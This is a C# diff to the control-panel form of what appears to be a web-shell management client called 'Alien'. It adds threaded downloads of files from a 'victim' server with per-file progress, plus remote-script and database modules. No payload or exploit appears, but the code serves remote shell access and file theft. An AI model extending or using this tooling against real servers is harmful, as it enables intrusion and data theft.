@@ -10,18 +10,20 @@ using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 using System.Windows.Forms.VisualStyles;
+using System.Xml.Linq;
 
 namespace Alien
 {
     public partial class frmControlPanel : Form
     {
-        private clsWeb m_web { get; set; }
+        private clsWeb m_web { get; init; }
         private clsVictim m_victim { get { return m_web.m_victim; } }
 
-        public clsInfoSpyder m_infoSpyder { get; set; }
-        public clsfnFileMgr m_fileMgr { get; set; }
+        public clsInfoSpyder m_infoSpyder { get; init; }
+        public clsfnFileMgr m_fileMgr { get; init; }
         public clsfnShell m_rShell { get; set; }
-        public clsfnDb m_dbMgr { get; set; }
+        public clsfnDb m_dbMgr { get; init; }
+        public clsfnRunScript m_runScript { get; init; }
 
         private WebBrowser m_ctrlInfoBrowser = new WebBrowser();
         private WebBrowser m_ctrlEvalBrowser = new WebBrowser();
@@ -43,6 +45,8 @@ namespace Alien
             m_infoSpyder = new clsInfoSpyder(web);
             m_fileMgr = new clsfnFileMgr(web);
             m_rShell = new clsfnShell(web);
+            m_runScript = new clsfnRunScript(web);
+
             m_dbMgr = new clsfnDb(web, "db.sqlite");
         }
 
@@ -390,25 +394,94 @@ namespace Alien
             return dicState;
         }
 
-        public async Task<(Dictionary<string, bool> dicState, string szSaveDirPath)> fnFileDownload(List<string> lsRemoteFilePath, int nThread = 3, int nChunkSize = 5 * 1024, Action fnCallback = null)
+        public async Task<(Dictionary<string, bool> dicState, string szSaveDirPath)> fnFileDownload(List<(string, long)> lsRemoteFile, int nThread = 3, int nChunkSize = 5 * 1024, Action fnCallback = null)
         {
             string szLocalSaveDirPath = Path.Combine("Victim", m_victim.m_szShellDomain, "Downloads");
             if (!Directory.Exists(szLocalSaveDirPath))
                 Directory.CreateDirectory(szLocalSaveDirPath);
 
-            Dictionary<string, bool> dicState = new Dictionary<string, bool>();
-
+            List<string> lsRemoteFilePath = lsRemoteFile.Select(x => x.Item1).ToList();
             lsRemoteFilePath = lsRemoteFilePath.Select(x => x.Replace("\\", "/")).ToList();
 
-            long nFileSize = -1;
+            Dictionary<string, bool> dicState = new Dictionary<string, bool>();
+            Dictionary<string, TreeNode> dicNode = new Dictionary<string, TreeNode>();
+            TreeNode nodeDownload = treeView4.Nodes[1];
 
-            foreach (string szRemoteFilePath in lsRemoteFilePath)
+            for (int i = 0; i < lsRemoteFilePath.Count; i++)
             {
-                string szFileName = Path.GetFileName(szRemoteFilePath);
-                string szLocalFilePath = Path.Combine(szLocalSaveDirPath, szFileName);
+                string szRemoteFilePath = lsRemoteFilePath[i];
+                long nFileSize = lsRemoteFile[i].Item2; // bytes
 
-                bool bRet = await m_fileMgr.fnbFileDownload(szRemoteFilePath, szLocalFilePath, nChunkSize, null);
-                dicState[szRemoteFilePath] = bRet;
+                string szFileName = Path.GetFileName(szRemoteFilePath);
+
+                TreeNode node = new TreeNode($"{szFileName}[0%|0/{nFileSize}]");
+                node.Tag = 0;
+                nodeDownload.Nodes.Add(node);
+
+                dicNode.Add(szRemoteFilePath, node);
+
+                nodeDownload.Expand();
+            }
+
+            List<Task> lsTask = new List<Task>();
+            using (SemaphoreSlim semaphore = new SemaphoreSlim(nThread))
+            {
+                for (int i = 0; i < lsRemoteFile.Count; i++)
+                {
+                    string szRemoteFilePath = lsRemoteFilePath[i];
+                    string szFileName = Path.GetFileName(szRemoteFilePath);
+                    string szLocalFilePath = Path.Combine(szLocalSaveDirPath, szFileName);
+
+                    long nFileSize = -1;
+                    long nProgress = 0;
+
+                    TreeNode node = dicNode[szRemoteFilePath];
+                    node.Tag = nProgress;
+
+                    if (nFileSize == -1)
+                        nFileSize = lsRemoteFile[i].Item2;
+
+                    Action act = () =>
+                    {
+                        Invoke(new Action(() =>
+                        {
+                            nProgress = (long)node.Tag;
+                            nProgress += nChunkSize;
+                            node.Tag = nProgress;
+
+                            string szProgress = (((decimal)nProgress / nFileSize) * 100).ToString("0.00");
+                            node.Text = $"{szFileName}[{szProgress}%|{nProgress}/{nFileSize}]";
+
+                            if (nProgress >= nFileSize)
+                            {
+                                nodeDownload.Nodes.Remove(node);
+                            }
+                        }));
+                    };
+
+                    lsTask.Add(Task.Run(async () =>
+                    {
+                        await semaphore.WaitAsync();
+
+                        try
+                        {
+                            bool bRet = await m_fileMgr.fnbFileDownload(szRemoteFilePath, szLocalFilePath, nChunkSize, act, fnCallback);
+                            dicState[szRemoteFilePath] = bRet;
+
+                            Invoke(new Action(() =>
+                            {
+                                if (dicNode.ContainsKey(szRemoteFilePath))
+                                    dicNode.Remove(szRemoteFilePath);
+                            }));
+                        }
+                        finally
+                        {
+                            semaphore.Release();
+                        }
+                    }));
+
+                    await Task.WhenAll(lsTask);
+                }
             }
 
             return (dicState, szLocalSaveDirPath);
@@ -480,9 +553,19 @@ namespace Alien
         #endregion
         #region Database
 
-        public void fnDbInit()
+        public async void fnDbInit()
         {
-            //Load database from *.sqlite file.
+            // Scan available modules.
+            var lsDb = await m_dbMgr.fnDbInit();
+            foreach (var module in lsDb)
+            {
+                ListViewItem item = new ListViewItem(module.Item1);
+                item.SubItems.Add(module.Item2 ? "YES" : "NO");
+
+                listView4.Items.Add(item);
+            }
+
+            // Load database config from *.sqlite file.
             treeView2.Nodes.Clear();
 
             var ls = m_dbMgr.fnGetAllDbConfig();
@@ -495,12 +578,12 @@ namespace Alien
             }
         }
 
-        async void fnGetTable()
+        void fnDbGetTable()
         {
 
         }
 
-        async void fnDbReadTable()
+        void fnDbReadTable()
         {
 
         }
@@ -519,6 +602,12 @@ namespace Alien
 
         async void fnSetup()
         {
+            if (!await fnbValidator())
+            {
+                MessageBox.Show("Validation failed", "fnbValidator()", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return;
+            }
+
             treeView3.ImageList = fileImageList;
             m_fileMgr.m_ExtIcon.Images.Add(fileImageList.Images["folder"]);
             m_fileMgr.m_ExtIcon.Images.SetKeyName(m_fileMgr.m_ExtIcon.Images.Count - 1, "folder");
@@ -538,40 +627,33 @@ namespace Alien
             m_ctrlEvalEditor.BringToFront();
             m_ctrlPostEditor.BringToFront();
 
-            if (await fnbValidator())
+            var fileInit = await m_fileMgr.fnszInit();
+
+            //Information
+            m_ctrlInfoBrowser.DocumentText = await fnszGetInfo();
+
+            //FileMgr
+            textBox1.Text = fileInit.szCurrentDir;
+            m_web.m_victim.m_bUnixLike = fileInit.bUnixLike;
+            foreach (string szName in fileInit.lsLogicalDrive)
             {
-                var fileInit = await m_fileMgr.fnszInit();
-
-                //Information
-                m_ctrlInfoBrowser.DocumentText = await fnszGetInfo();
-
-                //FileMgr
-                textBox1.Text = fileInit.szCurrentDir;
-                m_web.m_victim.m_bUnixLike = fileInit.bUnixLike;
-                foreach (string szName in fileInit.lsLogicalDrive)
-                {
-                    TreeNode node = new TreeNode(szName);
-                    node.ImageKey = "harddrive";
-                    treeView3.Nodes.Add(node);
-                }
-
-                fnFileAddPathToTreeView(fileInit.szCurrentDir);
-                treeView3.ExpandAll();
-
-                TreeNode cdNode = fnFindNodeWithFullPath(treeView3.Nodes, fileInit.szCurrentDir);
-                treeView3.SelectedNode = cdNode;
-
-                //Shell
-                m_rShell.m_szCurrentDir = fileInit.szCurrentDir;
-                fnShellInit();
-
-                //Database
-                fnDbInit();
+                TreeNode node = new TreeNode(szName);
+                node.ImageKey = "harddrive";
+                treeView3.Nodes.Add(node);
             }
-            else
-            {
-                MessageBox.Show("Validation failed", "fnbValidator()", MessageBoxButtons.OK, MessageBoxIcon.Error);
-            }
+
+            fnFileAddPathToTreeView(fileInit.szCurrentDir);
+            treeView3.ExpandAll();
+
+            TreeNode cdNode = fnFindNodeWithFullPath(treeView3.Nodes, fileInit.szCurrentDir);
+            treeView3.SelectedNode = cdNode;
+
+            //Shell
+            m_rShell.m_szCurrentDir = fileInit.szCurrentDir;
+            fnShellInit();
+
+            //Database
+            fnDbInit();
         }
 
         private void frmControlPanel_Load(object sender, EventArgs e)
@@ -705,6 +787,9 @@ namespace Alien
         {
             if (e.KeyCode == Keys.Enter)
             {
+                if (textBox3.Tag == null)
+                    return;
+
                 int nIdx = (int)textBox3.Tag;
                 string szCommand = textBox3.Text.Substring(nIdx);
 
@@ -712,6 +797,9 @@ namespace Alien
             }
             else if (e.KeyCode == Keys.Delete || e.KeyCode == Keys.Back)
             {
+                if (textBox3.Tag == null)
+                    return;
+
                 int nIdx = (int)textBox3.Tag;
                 if (textBox3.SelectionStart <= nIdx)
                 {
@@ -791,6 +879,8 @@ namespace Alien
             {
                 List<string> lsSrcFiles = ofd.FileNames.ToList();
 
+                tabControl6.SelectedIndex = 1;
+
                 fnFileUpload(lsSrcFiles, 3, 1024 * 10, fnFileMgrRefresh);
             }
         }
@@ -800,7 +890,9 @@ namespace Alien
         {
             List<clsfnFileMgr.stEntry> lsEntry = listView2.SelectedItems.Cast<ListViewItem>().Select(x => fnFileGetItemTag(x)).ToList();
             var lsDir = lsEntry.Where(x => x.bIsDirectory).Select(x => x.szEntryPath).ToList();
-            var lsFile = lsEntry.Where(x => !x.bIsDirectory).Select(x => x.szEntryPath).ToList();
+            var lsFile = lsEntry.Where(x => !x.bIsDirectory).Select(x => (x.szEntryPath, x.nSize)).ToList();
+
+            tabControl6.SelectedIndex = 1;
 
             var result = await fnFileDownload(lsFile);
             var dicState = result.dicState;
@@ -864,6 +956,29 @@ namespace Alien
 
         //Find
         private void toolStripButton4_Click_1(object sender, EventArgs e)
+        {
+
+        }
+
+        private void textBox4_KeyDown(object sender, KeyEventArgs e)
+        {
+
+        }
+
+        private void toolStripButton7_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        // Database.Add
+        private void toolStripMenuItem18_Click(object sender, EventArgs e)
+        {
+            frmDbEdit f = new frmDbEdit(m_dbMgr, this);
+            f.ShowDialog();
+        }
+
+        // Database.Reload
+        private void toolStripMenuItem19_Click(object sender, EventArgs e)
         {
 
         }
